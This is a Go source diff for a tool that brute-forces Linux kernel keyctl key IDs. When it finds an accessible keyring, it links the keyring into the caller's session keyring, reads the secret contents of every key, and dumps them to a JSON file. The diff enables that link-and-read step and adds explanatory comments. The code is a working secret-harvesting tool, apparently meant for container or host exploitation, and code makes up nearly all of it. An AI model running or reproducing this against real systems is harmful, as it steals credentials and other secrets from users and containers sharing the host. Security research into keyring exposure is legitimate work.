@@ -163,6 +163,18 @@ func listKeys(id keyId) ([]keyId, error) {
 	return keys, nil
 }
 
+// func newKeyring(id keyId) (*keyring, error) {
+// 	r1, _, errno := syscall.Syscall(syscall_keyctl, uintptr(keyctlGetKeyringId), uintptr(id), uintptr(1))
+// 	if errno != 0 {
+// 		return nil, errno
+// 	}
+
+// 	if id >= 0 {
+// 		id = keyId(r1)
+// 	}
+// 	return &keyring{id: id}, nil
+// }
+
 func (k Key) describeKeyId() ([]byte, error) {
 	var (
 		b1             []byte
@@ -345,122 +357,116 @@ type Key struct {
 }
 
 func hunter() {
+	// Status bar
 	bar := pb.StartNew(max)
-	// bar := pb.StartNew(max)
 
+	// Save results to file
 	f, _ := os.Create(output_path)
 	defer f.Close()
-	//f.WriteString("Starting test...\n")
 
-	//for i := 0; i < count; i++ {
+	// Brute force a range of keys in a container
 	for i := min; i < max; i++ {
 		bar.Increment()
-		fmt.Println(i)
 
-		// TODO this should be its own function?
 		k := Key{KeyId: int32(i)}
-		//breturn, err := describeKeyId(keyId(i))
+
+		// syscall keyctl_describekeyid(keyid)
+		// Collects information about a key ID but not its contents
 		breturn, err := k.describeKeyId()
 		if err != nil {
+
 			if msg := err.Error(); msg == "permission denied" {
+				// Permission denied means you don't possess it
+				// or you don't have a UID that is permitted but
+				// it confirms it exists in case you can become
+				// another user
 				k.Valid = true
 				k.Comments = append(k.Comments, "Found key but describe permission denied")
 			} else if msg := err.Error(); msg == "required key not available" {
+				// Required key not available confirms it doesn't exist
 				//fmt.Println("no key found here:", i)
 			} else {
+				// Not a lot of other errors that I know of
 				fmt.Println("%d: %s", i, err.Error())
-				//TODO check for weird errors
 			}
 
 		} else {
-			//fmt.Println(string(breturn))
-			// process results of breturn
+			// Means the key/keyring is accessible to us
 			k.Valid = true
+			// Fill in the key details based on the syscall response
 			k.populate_describe(breturn)
 
 			if k.Type == "keyring" {
-				//fmt.Println("Found a keyring!")
-				// list keys in keyring
+				// Keyrings hold keys and are what we're looking for
+
+				// list keys in keyring and fill in description deails
 				k.populate_subkeys()
 
-				// Linked hunt mode
-				// HACK TODO need to change the keyid to the current session
-				// err := keyctl_Link(keyId(k.KeyId), keyId(815294186))
-				// if err == nil {
-				// 	for i, subkey := range k.Subkeys {
-				// 		// Populate key information
-				// 		dresults, err := subkey.describeKeyId()
-				// 		//dresults, err := describeKeyId(keyId(subkey.KeyId))
-				// 		//TODO this is duplicate
-				// 		//TODO can this be recursive as a method for when you have keyrings in keyrings?
-				// 		aReturn := strings.Split(string(dresults), ";")
+				// If you don't "possess" the keyring then you will likely
+				// be unable to read its contents. This links the keyring
+				// to your personal session keyring, and then tries to read
+				// the contents.
+				// syscall keyctl_link(src, -3=session keyring)
+				err := keyctl_Link(keyId(k.KeyId), keyId(-3))
+				if err == nil {
+					// Try to read all the secrets of the keys
+					for i := range k.Subkeys {
+						err := k.Subkeys[i].Get()
+						if err != nil {
+							//TODO what else can happen?
+							fmt.Println(err.Error())
+						}
 
-				// 		// Populate info from results
-				// 		k.Subkeys[i].Type = aReturn[0]
-				// 		k.Subkeys[i].Uid = aReturn[1]
-				// 		k.Subkeys[i].Gid = aReturn[2]
-				// 		k.Subkeys[i].Perms = aReturn[3]
-				// 		k.Subkeys[i].Name = aReturn[4]
-
-				// 		kresults, err := subkey.Get()
-				// 		if err == nil {
-				// 			//fmt.Println("Wow looky here link")
-				// 			k.Subkeys[i].Byte_Content = kresults
-				// 			k.Subkeys[i].String_Content = string(kresults)
-				// 			//fmt.Println(string(kresults))
-				// 		} else {
-				// 			//TODO what else can happen?
-				// 			fmt.Println(err.Error())
-				// 		}
-
-				// 	}
-				// 	// Removing link to session
-				// 	keyctl_Unlink(keyId(k.KeyId), keyId(815294186))
-				// }
+					}
+					// Cleanup and unlink the keyring from your session
+					keyctl_Unlink(keyId(k.KeyId), keyId(-3))
+				}
 
 			} else if k.Type == "user" {
-				fmt.Println("Found a user key, skipping")
+				// We skip this because we're brute forcing the keyrings anyways so we'll
+				// get the keys from there instead.
+				//fmt.Println("Found a user key, skipping")
 			} else if k.Type == "" {
-				fmt.Println("Type is blank")
+				// I think there are some other key types or if an error...
+				//fmt.Println("Type is blank")
 			} else {
+				// Punt if something else happens
 				fmt.Println("Found another type of key I think: ", k.Type)
 				continue
 			}
 
-			// output, _ := json.MarshalIndent(k, "", " ")
-			// fmt.Println(string(output))
-
-			//if permission denied, try to find session and link
+			// Go back and collect the keyring data to be thorough
 			err := k.Get()
 			if err != nil {
+				// We would haven't already deduced this but there's a scenario
+				// where you have permission to describe() a key but not read() it
 				if msg := err.Error(); msg == "permission denied" {
 					k.Comments = append(k.Comments, "Read permission denied to user")
 				} else if err != nil {
-					// Todo handle other errors?
-
+					// TODO not sure what other errors could be
+					fmt.Println(err.Error())
 				}
 			}
-
-			fmt.Println("I made it here")
 
 		}
 
 		if k.Valid {
-			//TODO output json to file
+			// Output as JSON
 			output, _ := json.MarshalIndent(k, "", " ")
 			// DEBUG
 			//fmt.Print(string(output))
 			f.Write(output)
 		}
-		// TODO explain output
-
 	}
 	bar.Finish()
 	fmt.Println("Output saved to: ", output_path)
 }
 
 func (k *Key) populate_describe(bdesc []byte) error {
-	k.Valid = true
+	// Parse the response from the describekeyid syscall
+	// In the format of:
+	// 	user;1000;1000;3f1000000;myname
+	k.Valid = true // TODO do I need this here?
 	aReturn := strings.Split(string(bdesc), ";")
 
 	// Populate info from results
@@ -470,20 +476,22 @@ func (k *Key) populate_describe(bdesc []byte) error {
 	k.Perms = aReturn[3]
 	k.Name = aReturn[4]
 
-	// output, _ := json.MarshalIndent(k, "", " ")
-	// fmt.Println("populate_describe: ", string(output))
-
+	// TODO not very useful results
 	return nil
 }
 
 func (k *Key) populate_subkeys() (int, error) {
+	// Consume a keyid and run the syscall listkeys()
+	// Generates keyids for other keys part of the
+	// keychain.
 	nkid, err := listKeys(keyId(k.KeyId))
 	if err != nil {
 		return 0, err
 	}
 	var i int
+
 	for _, kid := range nkid {
-		// Turn it into a key
+		// Turn it into a key object
 		i++
 		nk := Key{KeyId: int32(kid)}
 		nkdesc, err := nk.describeKeyId()
@@ -502,6 +510,9 @@ func (k *Key) populate_subkeys() (int, error) {
 }
 
 func (k *Key) Get() error {
+	// Perform a syscall keyctlread() to get the secret bytes
+	// of a key. Returns error if it can't read the key.
+
 	var (
 		b        []byte
 		err      error
@@ -531,6 +542,7 @@ func (k *Key) Get() error {
 		}
 	}
 
+	// Update the original keypointer
 	content := b[:k.size]
 	k.Byte_Content = content
 	k.String_Content = string(content)
